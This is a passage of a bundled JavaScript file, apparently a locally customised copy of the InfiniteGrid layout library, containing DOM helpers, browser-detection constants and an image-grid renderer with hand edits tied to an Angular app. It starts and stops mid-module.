0;for(i=0;(u=o[i])!==undefined;i++)if(u===t){o=o.splice(i,1);break}}return this},Component}();t["default"]=o,e.exports=t["default"]}])});
//# sourceMappingURL=component.min.js.map
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["InfiniteGrid"] = factory();
	else
		root["eg"] = root["eg"] || {}, root["eg"]["InfiniteGrid"] = factory();
})(typeof self !== 'undefined' ? self : this, function() {
return /******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 7);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;
exports.STYLE = undefined;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };
var _typeof = typeof Symbol === "function" && typeof Symbol.iterator === "symbol" ? function (obj) { return typeof obj; } : function (obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; };

exports.toArray = toArray;
exports.matchHTML = matchHTML;
exports.$ = $;
exports.addEvent = addEvent;
exports.removeEvent = removeEvent;
exports.scroll = scroll;
exports.scrollTo = scrollTo;
exports.scrollBy = scrollBy;
exports.getStyles = getStyles;
exports.innerWidth = innerWidth;
exports.innerHeight = innerHeight;
exports.getStyleNames = getStyleNames;
exports.assignOptions = assignOptions;
exports.toZeroArray = toZeroArray;
exports.isWindow = isWindow;
exports.fill = fill;

var _browser = __webpack_require__(2);

var _consts = __webpack_require__(1);

function toArray(nodes) {
	// SCRIPT5014 in IE8
	var array = [];

	if (nodes) {
		for (var i = 0, len = nodes.length; i < len; i++) {
			array.push(nodes[i]);
		}
	}
	return array;
}
function matchHTML(html) {
	return html.match(/^<([A-z]+)\s*([^>]*)>/);
}
/**
 * Select or create element
 * @param {String|HTMLElement|jQuery} param
 *  when string given is as HTML tag, then create element
 *  otherwise it returns selected elements
 * @param {Boolean} multi
 * @returns {HTMLElement}
 */
function $(param) {
	var multi = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;

	var el = void 0;

	if (typeof param === "string") {
		// String (HTML, Selector)
		// check if string is HTML tag format
		var match = matchHTML(param);

		// creating element
		if (match) {
			// HTML
			var dummy = _browser.document.createElement("div");
			dummy.innerHTML = param;
			el = dummy.childNodes;
		} else {
			// Selector
			el = _browser.document.querySelectorAll(param);
		}
		if (multi) {
			el = toArray(el);
		} else {
			el = el && el.length > 0 && el[0] || undefined;
		}
	} else if (param === _browser.window) {
		// window
		el = param;
	} else if (param && param.nodeName && (param.nodeType === 1 || param.nodeType === 9)) {
		// HTMLElement, Document
		el = param;
	} else if ("jQuery" in _browser.window && param instanceof _browser.window.jQuery || (param && param.constructor.prototype.jquery) ) {
		// jQuery
		el = multi ? param.toArray() : param.get(0);
	} else if (Array.isArray(param)) {
		// console.time("param.map")
		el = param.map(function (v) {
			return $(v);
		});
		// console.timeEnd("param.map")
	
		if (!multi) {
			el = el.length >= 1 ? el[0] : undefined;
		}
	}
	return el;
}
function addEvent(element, type, handler, eventListenerOptions) {
	if (_consts.SUPPORT_ADDEVENTLISTENER) {
		var options = eventListenerOptions || false;

		if ((typeof eventListenerOptions === "undefined" ? "undefined" : _typeof(eventListenerOptions)) === "object") {
			options = _consts.SUPPORT_PASSIVE ? eventListenerOptions : false;
		}
		element.addEventListener(type, handler, options);
	} else if (element.attachEvent) {
		element.attachEvent("on" + type, handler);
	} else {
		element["on" + type] = handler;
	}
}
function removeEvent(element, type, handler) {
	if (element.removeEventListener) {
		element.removeEventListener(type, handler, false);
	} else if (element.detachEvent) {
		element.detachEvent("on" + type, handler);
	} else {
		element["on" + type] = null;
	}
}
function scroll(el, isVertical) {
	var prop = "scroll" + (isVertical ? "Top" : "Left");

	if (el === _browser.window) {
		return _browser.window[isVertical ? "pageYOffset" : "pageXOffset"] || _browser.document.body[prop] || _browser.document.documentElement[prop];
	} else {
		return el[prop];
	}
}
function scrollTo(el, x, y) {
	if (el === _browser.window) {
		el.scroll(x, y);
	} else {
		el.scrollLeft = x;
		el.scrollTop = y;
	}
}
function scrollBy(el, x, y) {
	if (el === _browser.window) {
		el.scrollBy(x, y);
	} else {
		el.scrollLeft += x;
		el.scrollTop += y;
	}
}
function getStyles(el) {
	return _consts.SUPPORT_COMPUTEDSTYLE ? _browser.window.getComputedStyle(el) : el.currentStyle;
}
function _getSize(el, name) {
	if (el === _browser.window) {
		// WINDOW
		return el.document.documentElement["client" + name];
	} else if (el.nodeType === 9) {
		// DOCUMENT_NODE
		var doc = el.documentElement;

		return Math.max(el.body["scroll" + name], doc["scroll" + name], el.body["offset" + name], doc["offset" + name], doc["client" + name]);
	} else {
		// NODE
		// console.time("getStyles");
		// var style = getStyles(el);
		// console.timeEnd("getStyles");
		// var value = style[name.toLowerCase()];
		var value = jQuery(el).css(name.toLowerCase());
		// console.log("value: ", value);
		// console.log("value2: ", value2);

		return parseFloat(/auto|%/.test(value) ? el["offset" + name] : value);
	}
}
function innerWidth(el) {
	return _getSize(el, "Width");
}
function innerHeight(el) {
	return _getSize(el, "Height");
}
var STYLE = exports.STYLE = {
	vertical: {
		pos1: "top",
		endPos1: "bottom",
		size1: "height",
		pos2: "left",
		endPos2: "right",
		size2: "width"
	},
	horizontal: {
		pos1: "left",
		endPos1: "right",
		size1: "width",
		pos2: "top",
		endPos2: "bottom",
		size2: "height"
	}
};

function getStyleNames(isHorizontal) {
	return STYLE[isHorizontal ? _consts.HORIZONTAL : _consts.VERTICAL];
}

function assignOptions(defaultOptions, options) {
	return _extends({}, _consts.DEFAULT_OPTIONS, defaultOptions, options);
}

function toZeroArray(outline) {
	if (!outline || !outline.length) {
		return [0];
	}
	return outline;
}

function isWindow(el) {
	return el === _browser.window;
}

function fill(arr, value) {
	var length = arr.length;

	for (var i = length - 1; i >= 0; --i) {
		arr[i] = value;
	}

	return arr;
}

/***/ }),
/* 1 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;
exports.DEFENSE_BROWSER = exports.WEBKIT_VERSION = exports.PROCESSING = exports.LOADING_PREPEND = exports.LOADING_APPEND = exports.IDLE = exports.ALIGN = exports.isMobile = exports.agent = exports.DEFAULT_OPTIONS = exports.GROUPKEY_ATT = exports.DUMMY_POSITION = exports.SINGLE = exports.MULTI = exports.NO_TRUSTED = exports.TRUSTED = exports.NO_CACHE = exports.CACHE = exports.HORIZONTAL = exports.VERTICAL = exports.PREPEND = exports.APPEND = exports.IGNORE_CLASSNAME = exports.CONTAINER_CLASSNAME = exports.RETRY = exports.IS_ANDROID2 = exports.IS_IOS = exports.IS_IE = exports.SUPPORT_PASSIVE = exports.SUPPORT_ADDEVENTLISTENER = exports.SUPPORT_COMPUTEDSTYLE = undefined;

var _browser = __webpack_require__(2);

var ua = _browser.window.navigator.userAgent;

var SUPPORT_COMPUTEDSTYLE = exports.SUPPORT_COMPUTEDSTYLE = !!("getComputedStyle" in _browser.window);
var SUPPORT_ADDEVENTLISTENER = exports.SUPPORT_ADDEVENTLISTENER = !!("addEventListener" in document);
var SUPPORT_PASSIVE = exports.SUPPORT_PASSIVE = function () {
	var supportsPassiveOption = false;

	try {
		if (SUPPORT_ADDEVENTLISTENER && Object.defineProperty) {
			document.addEventListener("test", null, Object.defineProperty({}, "passive", {
				get: function get() {
					supportsPassiveOption = true;
				}
			}));
		}
	} catch (e) {}
	return supportsPassiveOption;
}();

var IS_IE = exports.IS_IE = /MSIE|Trident|Windows Phone|Edge/.test(ua);
var IS_IOS = exports.IS_IOS = /iPhone|iPad/.test(ua);
var IS_ANDROID2 = exports.IS_ANDROID2 = /Android 2\./.test(ua);
var RETRY = exports.RETRY = 3;
var CONTAINER_CLASSNAME = exports.CONTAINER_CLASSNAME = "_eg-infinitegrid-container_";
var IGNORE_CLASSNAME = exports.IGNORE_CLASSNAME = "_eg-infinitegrid-ignore_";

var APPEND = exports.APPEND = true;
var PREPEND = exports.PREPEND = false;
var VERTICAL = exports.VERTICAL = "vertical";
var HORIZONTAL = exports.HORIZONTAL = "horizontal";
var CACHE = exports.CACHE = true;
var NO_CACHE = exports.NO_CACHE = false;
var TRUSTED = exports.TRUSTED = true;
var NO_TRUSTED = exports.NO_TRUSTED = false;
var MULTI = exports.MULTI = true;
var SINGLE = exports.SINGLE = false;
var DUMMY_POSITION = exports.DUMMY_POSITION = -100000;
var GROUPKEY_ATT = exports.GROUPKEY_ATT = "data-groupkey";

var DEFAULT_OPTIONS = exports.DEFAULT_OPTIONS = {
	horizontal: false,
	margin: 0
};

var agent = exports.agent = ua.toLowerCase();
var isMobile = exports.isMobile = /mobi|ios|android/.test(agent);

var ALIGN = exports.ALIGN = {
	START: "start",
	CENTER: "center",
	END: "end",
	JUSTIFY: "justify"
};

var IDLE = exports.IDLE = 0;
var LOADING_APPEND = exports.LOADING_APPEND = 1;
var LOADING_PREPEND = exports.LOADING_PREPEND = 2;
var PROCESSING = exports.PROCESSING = 4;

var webkit = /applewebkit\/([\d|.]*)/g.exec(agent);

var WEBKIT_VERSION = exports.WEBKIT_VERSION = webkit && parseInt(webkit[1], 10) || 0;
var DEFENSE_BROWSER = exports.DEFENSE_BROWSER = WEBKIT_VERSION && WEBKIT_VERSION < 537;

/***/ }),
/* 2 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;
/* eslint-disable no-new-func, no-nested-ternary */
var win = window;
/* eslint-enable no-new-func, no-nested-ternary */

exports.window = win;
var document = exports.document = win.document;

/***/ }),
/* 3 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _browser = __webpack_require__(2);

var _utils = __webpack_require__(0);

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var elements = [];
/* eslint-disable */
function onResize(e) {
	AutoSizer.resizeAll();
}
/* eslint-enable */

var AutoSizer = function () {
	function AutoSizer() {
		_classCallCheck(this, AutoSizer);
	}

	AutoSizer.add = function add(element) {
		var prefix = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "data-";

		if (!element.length) {
			(0, _utils.addEvent)(_browser.window, "resize", onResize);
		}
		element.__PREFIX__ = prefix;
		elements.push(element);
		AutoSizer.resize(element);
	};

	AutoSizer.remove = function remove(element) {
		var isFixed = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : false;

		var fixed = element.getAttribute(element.__PREFIX__ + "fixed") || "width";

		if (!isFixed) {
			element.style[fixed === "width" ? "height" : "width"] = "";
		}
		var index = elements.indexOf(element);

		if (!~index) {
			return;
		}
		elements.splice(index, 1);
		if (!elements.length) {
			(0, _utils.removeEvent)(_browser.window, "reisze", onResize);
		}
	};

	AutoSizer.resize = function resize(element) {
		var prefix = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : "data-";

		var elementPrefix = typeof element.__PREFIX__ === "string" ? element.__PREFIX__ : prefix;
		var dataWidth = element.getAttribute(elementPrefix + "width");
		var dataHeight = element.getAttribute(elementPrefix + "height");
		var fixed = element.getAttribute(elementPrefix + "fixed") || "width";

		if (fixed === "width") {
			var size = (0, _utils.innerWidth)(element) || dataWidth;
			element.style.height = dataHeight / dataWidth * size + "px";
		} else if (fixed === "height") {
			var _size = (0, _utils.innerHeight)(element) || dataHeight;

			element.style.width = dataWidth / dataHeight * _size + "px";
		}
	};

	AutoSizer.resizeAll = function resizeAll() {
		elements.forEach(function (element) {
			return AutoSizer.resize(element);
		});
	};

	return AutoSizer;
}();

exports["default"] = AutoSizer;
module.exports = exports["default"];

/***/ }),
/* 4 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defense(element) {
	var container = document.createElement("div");

	container.className = _consts.CONTAINER_CLASSNAME;
	container.style.position = "relative";
	container.style.height = "100%";

	var children = element.children;
	var length = children.length; // for IE8

	for (var i = 0; i < length; i++) {
		container.appendChild(children[0]);
	}

	element.appendChild(container);
	return container;
}

var DOMRenderer = function () {
	DOMRenderer.renderItem = function renderItem(item, styles) {
		if (item.el) {
			// var elStyle = item.el.style;
			// for debugging
			item.el.setAttribute(_consts.GROUPKEY_ATT, item.groupKey);
			// elStyle.position = "absolute";
			// ["left", "top", "width", "height"].forEach(function (p) {
			// 	p in styles && (elStyle[p] = styles[p] + "px");
			// });
			// EDIT: by Augus
			// var width = item.el.getAttribute("data-width");
			// var height = item.el.getAttribute("data-height");
			// item.el.setAttribute(`style`, `width: ${styles.width}px; height: ${styles.height}px; left: ${~~(styles.left)}px; top: ${~~(styles.top)}px;`);
			// NOTE: Windwos 如果 translateY 不是 4 倍数，就会变得很模糊
			item.el.setAttribute(`style`, `width: ${parseInt(styles.width / 2) * 2}px; height: ${parseInt(styles.height)}px; transform: ${"translate(" + parseInt(styles.left / 2) * 2 + "px, " + parseInt(styles.top / 2) * 2 + "px)"};`);
			item.el.setAttribute(`posX`, `${parseInt(styles.left / 2) * 2}`);
			item.el.setAttribute(`posY`, `${parseInt(styles.top / 2) * 2}`);
			// item.el.setAttribute(`style`, `width: ${parseInt(styles.width)}px; height: ${parseInt(styles.height)}px; transform: ${"translate(" + styles.left + "px, " + styles.top + "px)"};`);
			// item.el.setAttribute(`posX`, `${styles.left}`);
			// item.el.setAttribute(`posY`, `${styles.top}`);
			// item.el.style.width = styles.width;
			// item.el.style.height = styles.height;
			// item.el.style.transform = "translate3d(" + ~~(styles.left) + "px, " + ~~(styles.top) + "px, 0)";
			// $(item.el).css({
			// 	// position: "absolute",
			// 	width: styles.width,
			// 	height: styles.height,
			// 	transform: "translate3d(" + ~~(styles.left) + "px, " + ~~(styles.top) + "px, 0)"
			// });
		}
	};

	DOMRenderer.renderItems = function renderItems(items) {
		items.forEach(function (item) {
			if (ig._layout.options.column) {
				DOMRenderer.renderItem(item, item.rect);
			}
			else {
				DOMRenderer.renderItem(item, {
					top: item.rect.top,
					left: item.rect.left,
					height: item.size && item.size.height,
					width: item.size && item.size.width,
				});
			}
		});
	};

	DOMRenderer.asyncRemoveItems = function (images) {
		setTimeout(() => {
	        let total = images.length;
	        let once = 50;
	        let loopCount = total / once;
	        let countOfSend = 0;

	        function remove () {
	            var start = countOfSend * once;
	            var willRemoveImages = images.slice(start, start + once);
	            countOfSend += 1;
	            // console.log("正在删除第 %d 批图片", countOfSend);
	            DOMRenderer.removeItems(willRemoveImages);
	            loop();
	        }

	        function loop() {
	            if (countOfSend < loopCount) {
	                window.requestAnimationFrame(remove);
	            }
	        }
	        loop();
	    }, 0);
	};

	DOMRenderer.removeItems = function removeItems(items) {
		requestAnimationFrame(() => {
			// Note: 移除先將 src 清空，強制瀏覽器清除緩存
			for (var i = 0; i < items.length; i++) {
				var item = items[i];
			// items.forEach(function (item) {
				if (item.el) {
					var $el = $(item.el);
					// $.removeData(item.el);
					// $el.find("*").off();
					$el.find("img").off().attr("src" , "");
					$el.off();
					$el.remove();
					$el.removeClass("show");
					delete item.el;
				}
			}
			items = undefined;
		});
	};

	DOMRenderer.removeElement = function removeElement(element) {
		if (element && element.parentNode) {
			element.parentNode.removeChild(element);
		}
	};

	DOMRenderer.createElements = function createElements(items) {
		var elements = (0, _utils.$)(items.reduce(function (acc, v, i) {
			acc.push(v.content.replace(/^[\s\uFEFF]+|[\s\uFEFF]+$/g, ""));
			return acc;
		}, []).join(""), _consts.MULTI);

		return items.map(function (item, index) {
			item.el = elements[index];
			return item;
		});
	};

	function DOMRenderer(element, options) {
		_classCallCheck(this, DOMRenderer);

		_extends(this.options = {
			isOverflowScroll: false,
			isEqualSize: false,
			isVertical: true
		}, options);
		this._size = {
			containerOffset: 0,
			container: -1,
			view: -1,
			item: null
		};
		this._init(element);
		// this.resize();
	}

	DOMRenderer.prototype.getStatus = function getStatus() {
		return {
			cssText: this.container.style.cssText,
			options: _extends({}, this.options),
			_size: _extends({}, this._size)
		};
	};

	DOMRenderer.prototype.setStatus = function setStatus(status, items) {
		this.container.style.cssText = status.cssText;
		_extends(this.options, status.options);
		_extends(this._size, status._size);

		DOMRenderer.renderItems(items);
		this._insert(items, _consts.APPEND);
	};

	DOMRenderer.prototype.updateSize = function updateSize(items) {
		

		var _this = this;
		if (!items[0]) { return; }

		var $scope = $bodyScope || angular.element("body").scope();
		var isGridLayout = $scope.layout === "GridLayout";
		var blockWidth = $scope.imageSize.height;
		// console.time("infinite:clientWidth");
		if (isGridLayout) {
			if (!ig._layout._columnSize) {
				blockWidth = items[0].el.offsetWidth;
			}
			else {
				blockWidth = ig._layout._columnSize - ig._layout._columnSize % 5;
				blockWidth = parseInt(blockWidth / 5) * 5;
			}
		}
		// console.timeEnd("infinite:clientWidth");
		var isNameVisible = $scope.showName;
		var isMetasVisible = $scope.showMetas;
		var maxThumbnailHeight = parseInt(4000 * blockWidth / 200);
		// var maxThumbnailHeight = parseInt($testItem.find(".thumbnail").css('max-height'))|| 1280;
		// var maxThumbnailHeight = 1280;
		// console.time("infinite:updateSize");
		var result = items.map(function (item) {
			if (item.el) {

					if ($bodyScope.layout === "ListLayout") {
						let listHeight = Math.max(40, Math.ceil(parseInt(blockWidth / 10) * 10 / 3));
						item.size = {
							width: 10000,
							height: parseInt(listHeight / 2) * 2
						};
						return item;
					}
				// if (_this.options.isEqualSize) {
					// item.size = _extends({}, _this._size.item);
				// } else {

					// var $el = $(item.el);
					var width;
					var height;

					if ($bodyScope.layout === "SquareLayout") {
						width = 200;
						height = 200;
					}
					else {
						width = parseInt(item.el.dataset.width) || 200;
						height = parseInt(item.el.dataset.height) || 200;	
					}

					// var width = $el.data("width") || 200;
					// var height = $el.data("height") || 200;

					// 如果图片超级长，让图片比例维持容易阅读的模式
					if (!isGridLayout) {
						if (height / width >= 3 ) {
							height = width * 3;
						}
					}
					else {
						if (height / width >= 16 ) {
							height = width * 16;	
						}
					}

					height = height / (width / blockWidth);
					if (height > maxThumbnailHeight) height = maxThumbnailHeight;

					var finalHeight = height;
					if (isGridLayout || $bodyScope.layout === "SquareLayout") {
						if (isNameVisible) finalHeight += (23 + 13);
						if (isMetasVisible) finalHeight += 17;
					}
					
					// $el.height(finalHeight);
					// item.content = $el[0].outerHTML;

					item.size = {
						width: blockWidth,
						height: finalHeight
					};
				// }
				// if (!item.orgSize) {
					// item.orgSize = _extends({}, item.size);
					// item.orgSize = item.size;
				// }
			}
			return item;
		});
		// console.timeEnd("infinite:updateSize");
		return result;
	};

	DOMRenderer.prototype._init = function _init(el) {
		var element = (0, _utils.$)(el);
		var style = (0, _utils.getStyles)(element);

		this._orgStyle = {};

		if (style.position === "static") {
			this._orgStyle.position = element.style.position;
			element.style.position = "relative";
		}
		if (this.options.isOverflowScroll) {
			var target = this.options.isVertical ? ["Y", "X"] : ["X", "Y"];

			this._orgStyle.overflowX = element.style.overflowX;
			this._orgStyle.overflowY = element.style.overflowY;
			element.style["overflow" + target[0]] = "scroll";
			element.style["overflow" + target[1]] = "hidden";
			this.view = element;
			// defense code for android < 4.4 or webkit < 537
			this.container = !this.options.isVertical && _consts.DEFENSE_BROWSER ? _defense(element) : element;
		} else {
			// debugger
			// this.view = window;
			this.view = document.getElementById("box-container");
			this.container = element;
		}
	};

	DOMRenderer.prototype.append = function append(items) {
		this._insert(items, _consts.APPEND, {
			top: _consts.DUMMY_POSITION,
			left: _consts.DUMMY_POSITION
		});
	};

	DOMRenderer.prototype.prepend = function prepend(items) {
		this._insert(items, _consts.PREPEND, {
			top: _consts.DUMMY_POSITION,
			left: _consts.DUMMY_POSITION
		});
	};

	function clearChildren (elem) {
		while (elem.firstChild) {
		   elem.removeChild(elem.firstChild);
		}
	}

	DOMRenderer.prototype.clear = function clear() {

		// this.container.innerHTML = "";
		// NOTE: elem.removeChild 比 innerHTML 快很多...
		// 清除 connect 佔用
		this.container.querySelectorAll("img[src]").forEach(function (image) {
			if (!image.complete) {
				image.src = "";
				image.onload = null;
				image.onerror = null;
			}
		});
		clearChildren(this.container);
		// if (!this.options.isOverflowScroll) {
		// 	this.container.style[this.options.isVertical ? "height" : "width"] = "";
		// }
		this._size = {
			item: null,
			containerOffset: 0,
			viewport: -1,
			container: -1,
			view: -1
		};
	};

	DOMRenderer.prototype.createAndInsert = function createAndInsert(items, isAppend) {
		var itemsWithElement = DOMRenderer.createElements(items);

		DOMRenderer.renderItems(itemsWithElement);
		this._insert(itemsWithElement, isAppend);
	};

	DOMRenderer.prototype._insert = function _insert(items, isAppend, styles) {
		var df = document.createDocumentFragment();

		items.forEach(function (item) {
			styles && DOMRenderer.renderItem(item, styles);
			isAppend ? df.appendChild(item.el) : df.insertBefore(item.el, df.firstChild);
		});
		isAppend ? this.container.appendChild(df) : this.container.insertBefore(df, this.container.firstChild);
	};

	DOMRenderer.prototype._calcSize = function _calcSize() {
		return this.options.isVertical ? (0, _utils.innerWidth)(this.container) : (0, _utils.innerHeight)(this.container);
	};

	DOMRenderer.prototype.getViewSize = function getViewSize() {
		return window.innerHeight;
		// return this._size.view;
	};

	DOMRenderer.prototype.scrollBy = function scrollBy(point) {
		var pos = this.options.isVertical ? [0, point] : [point, 0];

		_utils.scrollBy.apply(undefined, [this.view].concat(pos));
	};

	DOMRenderer.prototype.getContainerOffset = function getContainerOffset() {
		return this._size.containerOffset;
	};

	DOMRenderer.prototype.getViewportSize = function getViewportSize() {
		// if (!this._size.viewport) {
		// this.resize();
		// }
		// return this._size.viewport;
		if (!$bodyScope.boxContianerWidth) {
			$bodyScope.boxContianerWidth = $boxContainer.innerWidth() || $bodyScope.boxContianerWidth;
		}

		if ($bodyScope.boxContianerWidth) {
			return $bodyScope.boxContianerWidth - 30;	
		}
		else {
			this.resize();
			return this._size.viewport;
		}
	};

	DOMRenderer.prototype.setContainerSize = function setContainerSize(size) {

		// // Note: 自订一个元件，让它一直处于已经载入内容的最下方，这样就能保持 scrollbar 不会跳动
		// 实验结果：目前架构没办法根据 scrollbar 位置决定内容，所以添加这个功能也没屁用
		// var $container = $("#box-container .box-list");
		// var $boxPlaceholder = $(".box-placeholder");
		// if ($boxPlaceholder.length === 0) {
		// 	console.log("在 %d 插入占位元素", size);
		// 	var $placeholder = $('<div class="box-placeholder""></div>');
		// 	$placeholder.css({
		// 		position: "absolute",
		// 		width: 1,
		// 		height: 1,
		// 		top: size
		// 	});
		// 	$placeholder.prependTo($container);
		// }
		// else {
		// 	var currentTop = parseInt($boxPlaceholder.css("top"));
		// 	if (currentTop < size) {
		// 		console.log("将 placeholder 移动到 %d", size);
		// 		$boxPlaceholder.css({
		// 			top: size
		// 		});
		// 	}
		// }
		// console.log(size);

		// if (!this.options.isOverflowScroll || !this.options.isVertical && _consts.DEFENSE_BROWSER) {
		// 	this.container.style[this.options.isVertical ? "height" : "width"] = size + "px";
		// }
		this.container.style.height = size + "px";
	};

	DOMRenderer.prototype.resize = function resize() {
		var isVertical = this.options.isVertical;

		// if (this.isNeededResize()) {
			this._size = {
				containerOffset: this.options.isOverflowScroll ? 0 : this.container["offset" + (isVertical ? "Top" : "Left")],
				viewport: this._calcSize(),
				view: isVertical ? (0, _utils.innerHeight)(this.view) : (0, _utils.innerWidth)(this.view),
				item: null
			};
			return true;
		// } else {
		// 	this._size.view = isVertical ? (0, _utils.innerHeight)(this.view) : (0, _utils.innerWidth)(this.view);
		// }
		// return false;
	};

	DOMRenderer.prototype.isNeededResize = function isNeededResize() {
		return this._calcSize() !== this._size.viewport;
	};

	DOMRenderer.prototype.destroy = function destroy() {
		this._size = {
			containerOffset: 0,
			viewport: -1,
			view: -1,
			item: null
		};
		// this.container.style[this.options.isVertical ? "height" : "width"] = "";
		// for (var p in this._orgStyle) {
		// 	this[this.options.isOverflowScroll ? "view" : "container"].style[p] = this._orgStyle[p];
		// }
	};

	return DOMRenderer;
}();

exports["default"] = DOMRenderer;
module.exports = exports["default"];

/***/ }),
/* 5 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;
exports.CHECK_ONLY_ERROR = exports.CHECK_ALL = undefined;

var _consts = __webpack_require__(1);

var _utils = __webpack_require__(0);

var _AutoSizer = __webpack_require__(3);

var _AutoSizer2 = _interopRequireDefault(_AutoSizer);

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { "default": obj }; }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

var CHECK_ALL = exports.CHECK_ALL = 1;
var CHECK_ONLY_ERROR = exports.CHECK_ONLY_ERROR = 2;

var errorImages = [];

function isDataAttribute(target, prefix) {
	return !!target.getAttribute(prefix + "width");
}

var ImageLoaded = function () {
	function ImageLoaded() {
		_classCallCheck(this, ImageLoaded);
	}

	ImageLoaded.waitImageLoaded = function waitImageLoaded(needCheck, _ref) {

		var prefix = _ref.prefix,
		    length = _ref.length,
		    type = _ref.type,
		    complete = _ref.complete,
		    error = _ref.error,
		    end = _ref.end;

		var checkCount = 0;
		var endCount = length || needCheck.reduce(function (sum, element) {
			return sum + element.length;
		}, 0);

		if (type !== CHECK_ONLY_ERROR) {
			checkCount = endCount;
		}
		var checkEnd = function checkEnd() {
			if (--endCount !== 0) {
				return;
			}
			end && end();
		};
		var checkImage = function checkImage() {
			checkCount--;
			if (checkCount !== 0) {
				return;
			}
			complete && complete();
		};
		// var onError = function onError(target) {
		// 	error && error({
		// 		target: target,
		// 		itemIndex: target.__ITEM_INDEX__
		// 	});
		// };
		var onCheck = function onCheck(e) {
			// var target = e.target || e.srcElement;

			// (0, _utils.removeEvent)(target, "error", onCheck);
			// (0, _utils.removeEvent)(target, "load", onCheck);

			// if (type === CHECK_ALL && isDataAttribute(target, prefix)) {
			// 	_AutoSizer2["default"].remove(target, e.type === "error");
			// } else {
				checkImage();
			// }
			// if (e.type === "error") {
			// 	errorImages.push(target.src);
			// 	onError(target);
			// }
			// delete target.__ITEM_INDEX__;
			checkEnd();
		};

		needCheck.forEach(function (images, i) {
			images.forEach(function (v) {
				// workaround for IE
				// if (v.complete) {
				// 	if (errorImages.indexOf(v.src) !== -1) {
				// 		onError(v);
				// 	}
				// 	checkImage();
				// 	checkEnd();
				// 	return;
				// }
				// v.__ITEM_INDEX__ = i;
				// if (type === CHECK_ALL && isDataAttribute(v, prefix)) {
				// 	_AutoSizer2["default"].add(v, prefix);
				// 	checkImage();
				// }
				// (0, _utils.addEvent)(v, "load", onCheck);
				// (0, _utils.addEvent)(v, "error", onCheck);
				// setTimeout(function () {
				onCheck();
				// }, 10);

				// _consts.IS_IE && v.setAttribute("src", v.getAttribute("src"));
			});
		});
	};

	ImageLoaded.checkImageLoaded = function checkImageLoaded(el) {
		if (el.tagName === "IMG") {
			return !el.complete ? [el] : [];
		} else {
			return (0, _utils.toArray)(el.querySelectorAll("img"));
		}
	};

	ImageLoaded.check = function check(elements, _ref2) {
	   	_ref2.complete && _ref2.complete();
		_ref2.end && _ref2.end();
	};

	return ImageLoaded;
}();

exports["default"] = ImageLoaded;

/***/ }),
/* 6 */
/***/ (function(module, exports, __webpack_require__) {

"use strict";


exports.__esModule = true;

var _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; };

